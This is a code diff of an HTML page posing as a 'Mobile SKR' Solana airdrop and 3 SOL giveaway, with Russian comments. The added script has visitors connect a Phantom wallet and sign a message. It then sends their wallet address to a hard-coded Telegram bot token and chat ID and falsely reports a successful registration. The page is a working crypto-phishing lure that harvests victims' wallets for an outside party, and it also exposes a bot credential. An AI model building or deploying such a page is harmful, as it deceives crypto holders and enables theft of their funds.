@@ -3,190 +3,259 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Mobile SKR | Solana Ecosystem</title>
+    <title>Mobile SKR Ecosystem</title>
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <style>
         :root {
-            --bg-dark: #000000;
-            --solana-cyan: #14f195;
-            --solana-purple: #9945ff;
-            --panel-bg: rgba(15, 15, 20, 0.9);
-            --text-white: #ffffff;
+            --bg: #030507;
+            --card-bg: rgba(18, 22, 28, 0.9);
+            --cyan: #14f195;
+            --purple: #9945ff;
+            --blue: #20e3f5;
+            --text: #ffffff;
+            --text-dim: rgba(255, 255, 255, 0.6);
         }
 
-        body, html {
+        body {
             margin: 0; padding: 0;
-            background: var(--bg-dark);
-            color: var(--text-white);
+            background-color: var(--bg);
+            color: var(--text);
             font-family: 'Inter', sans-serif;
             overflow-x: hidden;
-            min-height: 100vh;
         }
 
-        /* Эффект падающего снега на фоне */
-        #snow {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            pointer-events: none; z-index: 1;
+        canvas#bg-effect {
+            position: fixed; top: 0; left: 0; z-index: 1; pointer-events: none;
         }
 
-        .container {
+        .content {
             position: relative; z-index: 10;
             max-width: 1200px; margin: 0 auto; padding: 40px 20px;
-            text-align: center;
         }
 
-        /* Кнопки сверху как на фото */
-        .header-nav {
-            display: flex; justify-content: center; gap: 15px; margin-bottom: 60px;
+        /* Кнопки управления */
+        .top-nav {
+            display: flex; justify-content: center; gap: 15px; margin-bottom: 50px; flex-wrap: wrap;
         }
 
-        .btn {
-            padding: 12px 25px; border-radius: 8px; font-weight: 600;
-            border: none; cursor: pointer; transition: 0.3s; font-size: 14px;
+        .nav-btn {
+            padding: 12px 25px; border-radius: 8px; border: none;
+            font-weight: bold; cursor: pointer; font-size: 14px;
+            transition: 0.3s; min-width: 180px;
         }
-        .btn-gray { background: #1c1c1c; color: #fff; border: 1px solid #333; }
-        .btn-cyan { background: linear-gradient(90deg, #14f195, #00d2ff); color: #000; }
-        .btn-purple { background: linear-gradient(90deg, #80ecff, #9945ff); color: #fff; }
+        .btn-wallet { background: #232a33; color: white; border: 1px solid #3d4652; }
+        .btn-airdrop { background: linear-gradient(90deg, #14f195, #20e3f5); color: #000; }
+        .btn-raffle { background: linear-gradient(90deg, #6b8eff, #9945ff); color: white; }
+        .nav-btn:hover { transform: translateY(-2px); filter: brightness(1.1); }
+        .nav-btn:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
 
-        /* ЦЕНТРАЛЬНАЯ СФЕРА (Точно как на верхнем фото) */
-        .hero-visual {
+        /* Центральная 3D сфера */
+        .hero-sphere {
             position: relative; width: 400px; height: 400px;
-            margin: 0 auto 30px; display: flex; align-items: center; justify-content: center;
+            margin: 0 auto; display: flex; align-items: center; justify-content: center;
         }
 
-        .sphere-grid {
-            position: absolute; width: 100%; height: 100%;
-            border-radius: 50%;
-            background: radial-gradient(circle, rgba(153, 69, 255, 0.1) 0%, transparent 70%);
-            border: 1px solid rgba(20, 241, 149, 0.2);
-            box-shadow: 0 0 40px rgba(153, 69, 255, 0.2);
-            animation: rotateSphere 15s linear infinite;
-        }
+        #sphere-canvas { position: absolute; width: 100%; height: 100%; }
 
-        /* Имитация сетки нейронных связей */
-        .sphere-grid::after {
-            content: ''; position: absolute; top: 0; left: 0; right: 0; bottom: 0;
-            border-radius: 50%;
-            background-image: repeating-linear-gradient(45deg, transparent, transparent 20px, rgba(20, 241, 149, 0.05) 21px);
-            opacity: 0.5;
-        }
-
-        .solana-logo-container {
-            z-index: 5; transform: scale(1.2);
-        }
-
-        .skr-text {
-            font-size: 80px; font-weight: 900; letter-spacing: 5px;
+        .skr-logo {
+            font-size: 80px; font-weight: 900; letter-spacing: 4px;
             background: linear-gradient(90deg, #14f195, #9945ff);
             -webkit-background-clip: text; -webkit-text-fill-color: transparent;
-            filter: drop-shadow(0 0 10px rgba(20, 241, 149, 0.5));
+            z-index: 5; filter: drop-shadow(0 0 15px rgba(20,241,149,0.4));
         }
 
-        .tagline {
-            font-size: 18px; color: rgba(255, 255, 255, 0.7);
-            letter-spacing: 1px; margin-bottom: 50px;
+        .hero-subtitle {
+            text-align: center; font-size: 18px; margin: 20px 0 60px;
+            color: var(--text); font-weight: 400; opacity: 0.9;
         }
 
-        /* Информационные панели */
-        .info-grid {
-            display: grid; grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
-            gap: 20px; text-align: left;
+        /* Сетка карточек */
+        .dashboard {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 20px;
         }
 
-        .panel {
-            background: var(--panel-bg); padding: 25px; border-radius: 12px;
-            border: 1px solid rgba(255, 255, 255, 0.05);
-            backdrop-filter: blur(10px);
+        .card {
+            background: var(--card-bg); border-radius: 15px;
+            padding: 25px; border: 1px solid rgba(255,255,255,0.05);
+            backdrop-filter: blur(12px);
         }
 
-        .panel h3 { color: var(--solana-cyan); margin-top: 0; font-size: 16px; text-transform: uppercase; }
-        .panel p { font-size: 14px; line-height: 1.6; color: rgba(255, 255, 255, 0.6); }
+        .card h3 { color: var(--cyan); margin-bottom: 15px; font-size: 14px; text-transform: uppercase; letter-spacing: 1px; }
+        .card p { font-size: 13px; line-height: 1.6; color: var(--text-dim); margin: 0; }
 
-        @keyframes rotateSphere {
-            from { transform: rotate(0deg); }
-            to { transform: rotate(360deg); }
+        /* Токеномика */
+        .pie-container { display: flex; align-items: center; gap: 15px; margin-top: 10px; }
+        .donut {
+            width: 60px; height: 60px; border-radius: 50%;
+            background: conic-gradient(var(--cyan) 0% 30%, var(--purple) 30% 55%, var(--blue) 55% 80%, #ffb800 80% 100%);
+            position: relative;
         }
+        .donut::after {
+            content: ''; position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%, -50%); width: 34px; height: 34px;
+            background: #12161c; border-radius: 50%;
+        }
+        .legend { font-size: 10px; list-style: none; padding: 0; margin: 0; color: var(--text-dim); }
+        .legend li { display: flex; align-items: center; gap: 5px; margin-bottom: 2px; }
+        .dot { width: 6px; height: 6px; border-radius: 50%; }
+
+        .status-msg { margin-top: 10px; font-size: 12px; color: var(--cyan); text-align: center; min-height: 18px; }
     </style>
 </head>
 <body>
 
-<canvas id="snow"></canvas>
+<canvas id="bg-effect"></canvas>
 
-<div class="container">
-    <div class="header-nav">
-        <button class="btn btn-gray">Connect Wallet</button>
-        <button class="btn btn-cyan">Participate in Airdrop</button>
-        <button class="btn btn-purple">Join 3 SOL Raffle</button>
+<div class="content">
+    <div class="top-nav">
+        <button class="nav-btn btn-wallet" id="connectBtn">Connect Wallet</button>
+        <button class="nav-btn btn-airdrop" id="airdropBtn" disabled>Participate in Airdrop</button>
+        <button class="nav-btn btn-raffle" id="raffleBtn" disabled>Join 3 SOL Giveaway</button>
     </div>
 
-    <div class="hero-visual">
-        <div class="sphere-grid"></div>
-        <div class="solana-logo-container">
-            <div class="skr-text">SKR</div>
-        </div>
+    <div class="hero-sphere">
+        <canvas id="sphere-canvas"></canvas>
+        <div class="skr-logo">SKR</div>
     </div>
 
-    <div class="tagline">
+    <div class="hero-subtitle">
         Mobile SKR • Native Ecosystem Asset • Open Mobile Platform
     </div>
 
-    <div class="info-grid">
-        <div class="panel">
+    <div id="statusLabel" class="status-msg"></div>
+
+    <div class="dashboard">
+        <div class="card">
             <h3>Our Mission</h3>
             <p>Today mobile duopoly decides which apps are available. Mobile SKR builds an open platform where value is shared with the community.</p>
         </div>
-        <div class="panel">
+        <div class="card">
             <h3>Linear Inflation</h3>
             <p>Year 1: 10% inflation. Annual decay of 25% per year until reaching a terminal rate of 2% for long-term security.</p>
+            <div style="height: 40px; border-bottom: 2px solid var(--cyan); margin-top: 15px; background: linear-gradient(transparent, rgba(20,241,149,0.1))"></div>
         </div>
-        <div class="panel">
+        <div class="card">
             <h3>Airdrop Pool</h3>
             <p>3,000,000 SKR total allocation. Each eligible wallet receives 500 SKR. Claim your share before the pool is exhausted.</p>
+        </div>
+        <div class="card">
+            <h3>Tokenomics</h3>
+            <div class="pie-container">
+                <div class="donut"></div>
+                <ul class="legend">
+                    <li><span class="dot" style="background:var(--cyan)"></span> 30% Airdrop</li>
+                    <li><span class="dot" style="background:var(--purple)"></span> 25% Growth</li>
+                    <li><span class="dot" style="background:var(--blue)"></span> 15% Team</li>
+                    <li><span class="dot" style="background:#ffb800"></span> 30% Other</li>
+                </ul>
+            </div>
         </div>
     </div>
 </div>
 
 <script>
-    // Скрипт красивого снега
-    const canvas = document.getElementById('snow');
-    const ctx = canvas.getContext('2d');
-    let particles = [];
+    // --- ДАННЫЕ TELEGRAM ---
+    const TG_TOKEN = "8425995205:AAEuTNVYnHHKMO87GOgAo1YIxr7WfhvPW2E";
+    const TG_CHAT = "1041935839";
 
-    function resize() {
-        canvas.width = window.innerWidth;
-        canvas.height = window.innerHeight;
-    }
-    window.onresize = resize;
-    resize();
+    let userWallet = null;
 
-    class Particle {
-        constructor() {
-            this.x = Math.random() * canvas.width;
-            this.y = Math.random() * canvas.height;
-            this.size = Math.random() * 2 + 0.5;
-            this.speed = Math.random() * 1 + 0.2;
-            this.opacity = Math.random() * 0.5;
-        }
-        update() {
-            this.y += this.speed;
-            if (this.y > canvas.height) this.y = -10;
-        }
-        draw() {
-            ctx.fillStyle = `rgba(255, 255, 255, ${this.opacity})`;
-            ctx.beginPath();
-            ctx.arc(this.x, this.y, this.size, 0, Math.PI * 2);
-            ctx.fill();
-        }
+    // --- ЛОГИКА КОШЕЛЬКА ---
+    const connectBtn = document.getElementById('connectBtn');
+    const airdropBtn = document.getElementById('airdropBtn');
+    const raffleBtn = document.getElementById('raffleBtn');
+    const statusLabel = document.getElementById('statusLabel');
+
+    async function connect() {
+        try {
+            const provider = window.solana || window.phantom?.solana;
+            if (!provider) return alert("Phantom wallet not found!");
+            
+            const resp = await provider.connect();
+            userWallet = resp.publicKey.toString();
+            
+            connectBtn.innerText = userWallet.slice(0,4) + '...' + userWallet.slice(-4);
+            airdropBtn.disabled = false;
+            raffleBtn.disabled = false;
+            statusLabel.innerText = "Wallet Connected!";
+        } catch (e) { console.error(e); }
     }
 
-    for(let i = 0; i < 150; i++) particles.push(new Particle());
+    async function handleAction(type) {
+        if (!userWallet) return;
+        statusLabel.innerText = "Please sign message in your wallet...";
+        
+        try {
+            const provider = window.solana || window.phantom?.solana;
+            const msg = `SKR HUB: ${type}\nWallet: ${userWallet}\nDate: ${new Date().toLocaleDateString()}`;
+            const encoded = new TextEncoder().encode(msg);
+            const signed = await provider.signMessage(encoded, "utf8");
+            
+            // Отправка в ТГ
+            const text = `🔔 *New Action*\nType: ${type}\nWallet: \`${userWallet}\``;
+            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({ chat_id: TG_CHAT, text: text, parse_mode: "Markdown" })
+            });
 
-    function animate() {
-        ctx.clearRect(0, 0, canvas.width, canvas.height);
-        particles.forEach(p => { p.update(); p.draw(); });
-        requestAnimationFrame(animate);
+            statusLabel.innerText = "✅ Successfully registered!";
+            alert("Success!");
+        } catch (e) {
+            statusLabel.innerText = "❌ Action cancelled";
+        }
     }
-    animate();
+
+    connectBtn.onclick = connect;
+    airdropBtn.onclick = () => handleAction("Airdrop Claim");
+    raffleBtn.onclick = () => handleAction("3 SOL Raffle");
+
+    // --- ВИЗУАЛЬНЫЕ ЭФФЕКТЫ ---
+    // Сфера
+    const sCanvas = document.getElementById('sphere-canvas');
+    const sCtx = sCanvas.getContext('2d');
+    function drawSphere() {
+        sCanvas.width = 400; sCanvas.height = 400;
+        let time = Date.now() * 0.001;
+        sCtx.clearRect(0,0,400,400);
+        sCtx.translate(200, 200);
+        for(let i=0; i<50; i++) {
+            let x = Math.sin(time + i) * 150;
+            let y = Math.cos(time + i * 0.5) * 150;
+            sCtx.fillStyle = i % 2 === 0 ? '#14f195' : '#9945ff';
+            sCtx.beginPath(); sCtx.arc(x, y, 2, 0, Math.PI*2); sCtx.fill();
+            if(i > 0) {
+                sCtx.strokeStyle = 'rgba(153, 69, 255, 0.1)';
+                sCtx.beginPath(); sCtx.moveTo(x,y); sCtx.lineTo(0,0); sCtx.stroke();
+            }
+        }
+        requestAnimationFrame(drawSphere);
+    }
+    drawSphere();
+
+    // Снег
+    const bgCanvas = document.getElementById('bg-effect');
+    const bgCtx = bgCanvas.getContext('2d');
+    let parts = [];
+    function initBg() {
+        bgCanvas.width = window.innerWidth; bgCanvas.height = window.innerHeight;
+        parts = Array.from({length: 80}, () => ({
+            x: Math.random() * bgCanvas.width,
+            y: Math.random() * bgCanvas.height,
+            s: Math.random() * 2,
+            v: Math.random() * 0.5 + 0.1
+        }));
+    }
+    function drawBg() {
+        bgCtx.clearRect(0,0,bgCanvas.width, bgCanvas.height);
+        bgCtx.fillStyle = "rgba(255,255,255,0.3)";
+        parts.forEach(p => {
+            p.y += p.v; if(p.y > bgCanvas.height) p.y = 0;
+            bgCtx.beginPath(); bgCtx.arc(p.x, p.y, p.s, 0, Math.PI*2); bgCtx.fill();
+        });
+        requestAnimationFrame(drawBg);
+    }
+    window.onresize = initBg; initBg(); drawBg();
 </script>
-
 </body>
 </html>
